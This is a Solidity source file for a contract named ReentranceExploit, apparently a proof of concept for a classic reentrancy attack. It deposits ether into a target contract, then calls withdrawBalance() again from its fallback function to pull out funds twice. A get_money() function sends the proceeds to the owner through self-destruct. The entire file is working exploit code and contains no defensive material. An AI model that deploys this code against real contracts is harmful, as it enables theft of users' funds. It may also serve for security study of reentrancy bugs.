pragma solidity ^0.4.15;

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    int public was_here=0;
    int public and_here=0;
    int public depook=0;
    address public vulnerable_contract;
    address public owner;

    function ReentranceExploit(){
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) payable{
        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()")));
    }

    function launch_attack(){
        attackModeIsOn = true;
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        vulnerable_contract.call(bytes4(sha3("withdrawBalance()")));
    }  


    function () payable{
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
                vulnerable_contract.call(bytes4(sha3("withdrawBalance()")));
        }
    }

    function get_money(){
        suicide(owner);
    }

}
